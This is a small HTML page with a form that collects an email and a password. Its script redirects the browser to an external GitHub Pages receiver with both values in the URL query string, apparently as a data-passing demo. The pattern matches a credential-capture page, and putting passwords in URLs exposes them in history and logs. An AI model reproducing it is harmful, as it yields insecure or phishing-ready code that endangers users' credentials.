<!-- form.html -->
<!DOCTYPE html>
<html>
<head>
  <title>Sender Form</title>
</head>
<body>
  <h1>Send Data via URL</h1>
  <form id="dataForm">
    <label>Email: <input type="email" id="email" required></label><br><br>
    <label>Password: <input type="password" id="password" required></label><br><br>
    <button type="submit">Send</button>
  </form>

  <script>
    document.getElementById('dataForm').addEventListener('submit', function(event) {
      event.preventDefault();
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;

      // Replace this with the actual URL of your receiver HTML (in the other repo)
      const receiverURL = 'https://zeusjolet.github.io/receiver/index.html';

      // Redirect with URL parameters
      window.location.href = `${receiverURL}?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`;
    });
  </script>
</body>
</html>
